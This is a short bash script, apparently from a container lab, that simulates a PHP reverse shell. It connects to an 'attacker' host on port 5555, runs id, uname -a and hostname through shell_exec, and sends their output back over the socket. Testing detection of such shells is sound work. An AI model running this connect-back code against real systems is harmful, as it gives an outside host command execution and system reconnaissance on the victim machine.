#!/bin/bash
# Victim script: PHP reverse shell simulator
# Requires php-cli installed in the victim container
ATTACKER_IP=${ATTACKER_IP:-shellsnare-attacker}
PORT=5555

echo "[*] Launching PHP reverse shell to ${ATTACKER_IP}:${PORT}"

php -r "
\$sock = fsockopen('${ATTACKER_IP}', ${PORT}, \$errno, \$errstr, 5);
if (!\$sock) { echo \"[!] Cannot connect: \$errstr\n\"; exit(1); }
fwrite(\$sock, \"PHP reverse shell connected\n\");
\$cmds = ['id', 'uname -a', 'hostname'];
foreach (\$cmds as \$cmd) {
    fwrite(\$sock, \"$ \$cmd\n\");
    \$out = shell_exec(\$cmd);
    fwrite(\$sock, \$out ?: \"(no output)\n\");
    usleep(300000);
}
fwrite(\$sock, \"[*] PHP shell session complete.\n\");
fclose(\$sock);
echo \"[*] PHP reverse shell demo complete.\n\";
" 2>&1 || echo "[!] PHP not available or connection refused."
